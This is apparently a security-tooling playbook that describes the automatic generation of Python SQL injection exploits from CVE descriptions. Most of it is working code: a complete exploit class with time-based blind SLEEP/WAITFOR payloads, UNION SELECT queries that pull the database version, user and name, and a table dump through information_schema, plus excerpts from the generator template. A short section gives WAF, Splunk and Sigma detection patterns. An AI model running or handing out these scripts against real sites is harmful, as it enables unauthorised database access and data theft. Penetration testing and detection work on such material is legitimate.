# SQL Injection Exploit Generation

## Overview
- **Purpose**: Automatically generate Python exploit scripts for SQL injection vulnerabilities from CVE data
- **Category**: exploitation
- **Severity**: high
- **Tags**: sql-injection, sqli, exploit-generation, cve, database-extraction, time-based-blind, union-select, T1190

## Context and Use-Cases
- Generate working SQL injection exploits from CVE descriptions containing endpoint and parameter information
- Automate testing for time-based blind SQL injection vulnerabilities
- Extract database metadata (version, user, database name) via UNION SELECT
- Dump table names from information_schema
- Useful for penetration testing, vulnerability validation, and security research

## Key Parameters and Inputs
- **cve_data** (dict, required): CVE information including `cve_id`, `description`. Example: `{"cve_id": "CVE-2024-1234", "description": "SQL injection via id parameter in /vulnerable.php"}`
- **target_info** (dict, required): Target configuration. Example: `{"target_url": "http://target.com"}`
- **details** (dict, required): Extracted vulnerability details including `endpoints` (list), `parameters` (list), `software` (string), `version` (string). Example: `{"endpoints": ["/vulnerable.php"], "parameters": ["id"]}`

## Procedure
1. Parse CVE description to extract endpoint path and vulnerable parameter name using regex
2. Generate Python exploit class with session management and target URL configuration
3. Implement `test_injection()` method with time-based blind payloads (SLEEP, WAITFOR DELAY)
4. Implement `extract_database_info()` method with UNION SELECT queries for VERSION(), USER(), DATABASE()
5. Implement `dump_tables()` method querying information_schema.tables
6. Add command-line interface accepting target URL as argument
7. Return complete exploit script with usage instructions

## Examples

### Generated Exploit Script Structure
```python
#!/usr/bin/env python3
# SQL Injection Exploit for CVE-2024-1234
# Vulnerability: SQL injection via id parameter in /vulnerable.php
# Target: WordPress 5.8.0

import requests
import sys
import time
from urllib.parse import quote

class SQLiExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.endpoint = "/vulnerable.php"
        self.parameter = "id"
        self.session = requests.Session()

    def test_injection(self):
        """Test if target is vulnerable"""
        print(f"[+] Testing SQL injection on {self.target_url}{self.endpoint}")

        payloads = [
            "1' AND SLEEP(3)--",
            "1' OR SLEEP(3)--",
            "1'; WAITFOR DELAY '00:00:03'--"
        ]

        for payload in payloads:
            start_time = time.time()
            try:
                response = self.session.get(
                    f"{self.target_url}{self.endpoint}",
                    params={self.parameter: payload},
                    timeout=10
                )
                elapsed = time.time() - start_time

                if elapsed >= 3:
                    print(f"[+] Vulnerable! Payload: {payload}")
                    return True
            except requests.exceptions.Timeout:
                print(f"[+] Likely vulnerable (timeout): {payload}")
                return True
            except Exception as e:
                continue

        return False

    def extract_database_info(self):
        """Extract database information"""
        print("[+] Extracting database information...")

        queries = {
            "version": "SELECT VERSION()",
            "user": "SELECT USER()",
            "database": "SELECT DATABASE()"
        }

        results = {}

        for info_type, query in queries.items():
            payload = f"1' UNION SELECT 1,({query}),3--"
            try:
                response = self.session.get(
                    f"{self.target_url}{self.endpoint}",
                    params={self.parameter: payload}
                )

                if response.status_code == 200:
                    results[info_type] = "Check response manually"
                    print(f"[+] {info_type.title()}: Check response for {query}")
            except Exception as e:
                print(f"[-] Error extracting {info_type}: {e}")

        return results

    def dump_tables(self):
        """Dump table names"""
        print("[+] Attempting to dump table names...")

        payload = "1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"

        try:
            response = self.session.get(
                f"{self.target_url}{self.endpoint}",
                params={self.parameter: payload}
            )

            if response.status_code == 200:
                print("[+] Tables dumped - check response")
                return response.text
        except Exception as e:
            print(f"[-] Error dumping tables: {e}")

        return None

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        print(f"Example: python3 {sys.argv[0]} http://target.com")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = SQLiExploit(target_url)

    print(f"[+] SQL Injection Exploit for CVE-2024-1234")
    print(f"[+] Target: {target_url}")

    if exploit.test_injection():
        print("[+] Target appears vulnerable!")
        exploit.extract_database_info()
        exploit.dump_tables()
    else:
        print("[-] Target does not appear vulnerable")

if __name__ == "__main__":
    main()
```

### Usage Example
```bash
# Test target for SQL injection vulnerability
python3 sqli_exploit.py http://target.com

# Expected output if vulnerable:
# [+] SQL Injection Exploit for CVE-2024-1234
# [+] Target: http://target.com
# [+] Testing SQL injection on http://target.com/vulnerable.php
# [+] Vulnerable! Payload: 1' AND SLEEP(3)--
# [+] Target appears vulnerable!
# [+] Extracting database information...
# [+] Version: Check response for SELECT VERSION()
# [+] Attempting to dump table names...
```

## Indicators / Detection

### Log Sources
- Web server access logs (Apache, Nginx)
- Web Application Firewall (WAF) logs
- Database query logs (MySQL, PostgreSQL, MSSQL)
- Intrusion Detection System (IDS) alerts

### Detection Patterns

**WAF/IDS Rules (Regex)**
```regex
(SLEEP\s*\(\s*\d+\s*\)|WAITFOR\s+DELAY|BENCHMARK\s*\()
(UNION\s+SELECT.*information_schema)
('|\"|;|--|\#|\/\*).*(SELECT|UNION|INSERT|UPDATE|DELETE)
```

**Splunk Query**
```spl
index=web_logs
| regex _raw="(?i)(sleep\(|waitfor\s+delay|union\s+select|information_schema|'--|'\s+or\s+1=1)"
| stats count by src_ip, uri, query_string
| where count > 5
```

**Sigma Rule**
```yaml
title: SQL Injection Attack Pattern
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - "' OR 1=1"
      - "UNION SELECT"
      - "SLEEP("
      - "WAITFOR DELAY"
      - "information_schema"
  condition: selection
```


## Limitations and Caveats

- **Response Parsing**: Generated exploits include generic response checking; application-specific HTML parsing requires manual customization
- **Column Count**: UNION SELECT payloads assume 3 columns; actual column count must be determined through trial or error-based enumeration
- **Network Latency**: Time-based blind detection using 3-second delays may produce false positives on high-latency networks
- **WAF Evasion**: Basic payloads may be blocked by modern WAFs; advanced obfuscation techniques not included
- **Database Variations**: Payloads target MySQL/MariaDB syntax; PostgreSQL, MSSQL, Oracle require syntax adjustments
- **Authentication**: Exploits assume unauthenticated endpoints; authenticated targets require session/token handling
- **IDS Alerts**: Aggressive testing may trigger security alerts and IP blocking

## Source Excerpts

### [S1] Vulnerability Analysis and Parameter Extraction
```python
# From exploit_template.py lines 277-305
def _analyze_vulnerability_details(self, description, cve_data):
    """Analyze CVE data to extract specific vulnerability details"""
    import re

    vuln_type = "generic"
    specific_details = {
        "endpoints": [],
        "parameters": [],
        "payload_location": "unknown",
        "software": "unknown",
        "version": "unknown",
        "attack_vector": "unknown"
    }

    description_lower = description.lower()

    # SQL Injection detection and details
    if any(keyword in description_lower for keyword in ["sql injection", "sqli"]):
        vuln_type = "sql_injection"
        # Extract endpoint from description
        endpoint_match = re.search(r'(/[^\s]+\.php[^\s]*)', description)
        if endpoint_match:
            specific_details["endpoints"] = [endpoint_match.group(1)]
        # Extract parameter names
        param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
        if param_matches:
            specific_details["parameters"] = param_matches
```

### [S2] SQL Injection Exploit Generation Method
```python
# From exploit_template.py lines 363-492
def _generate_sql_injection_exploit(self, cve_data, target_info, details):
    """Generate specific SQL injection exploit based on CVE details"""
    cve_id = cve_data.get("cve_id", "")
    endpoint = details.get("endpoints", ["/vulnerable.php"])[0] if details.get("endpoints") else "/vulnerable.php"
    parameter = details.get("parameters", ["id"])[0] if details.get("parameters") else "id"

    return f'''#!/usr/bin/env python3
# SQL Injection Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...
# Target: {details.get("software", "Unknown")} {details.get("version", "")}

import requests
import sys
import time
from urllib.parse import quote

class SQLiExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.endpoint = "{endpoint}"
        self.parameter = "{parameter}"
        self.session = requests.Session()

    def test_injection(self):
        """Test if target is vulnerable"""
        print(f"[+] Testing SQL injection on {{self.target_url}}{{self.endpoint}}")

        # Time-based blind SQL injection test
        payloads = [
            "1' AND SLEEP(3)--",
            "1' OR SLEEP(3)--",
            "1'; WAITFOR DELAY '00:00:03'--"
        ]

        for payload in payloads:
            start_time = time.time()
            try:
                response = self.session.get(
                    f"{{self.target_url}}{{self.endpoint}}",
                    params={{self.parameter: payload}},
                    timeout=10
                )
                elapsed = time.time() - start_time

                if elapsed >= 3:
                    print(f"[+] Vulnerable! Payload: {{payload}}")
                    return True
            except requests.exceptions.Timeout:
                print(f"[+] Likely vulnerable (timeout): {{payload}}")
                return True
            except Exception as e:
                continue

        return False
```

### [S3] Database Information Extraction
```python
# From exploit_template.py lines 419-469
def extract_database_info(self):
    """Extract database information"""
    print("[+] Extracting database information...")

    queries = {
        "version": "SELECT VERSION()",
        "user": "SELECT USER()",
        "database": "SELECT DATABASE()"
    }

    results = {}

    for info_type, query in queries.items():
        payload = f"1' UNION SELECT 1,({query}),3--"
        try:
            response = self.session.get(
                f"{self.target_url}{self.endpoint}",
                params={self.parameter: payload}
            )

            if response.status_code == 200:
                results[info_type] = "Check response manually"
                print(f"[+] {info_type.title()}: Check response for {query}")
        except Exception as e:
            print(f"[-] Error extracting {info_type}: {e}")

    return results

def dump_tables(self):
    """Dump table names"""
    print("[+] Attempting to dump table names...")

    # MySQL/MariaDB
    payload = "1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"

    try:
        response = self.session.get(
            f"{self.target_url}{self.endpoint}",
            params={self.parameter: payload}
        )

        if response.status_code == 200:
            print("[+] Tables dumped - check response")
            return response.text
    except Exception as e:
        print(f"[-] Error dumping tables: {e}")

    return None
```
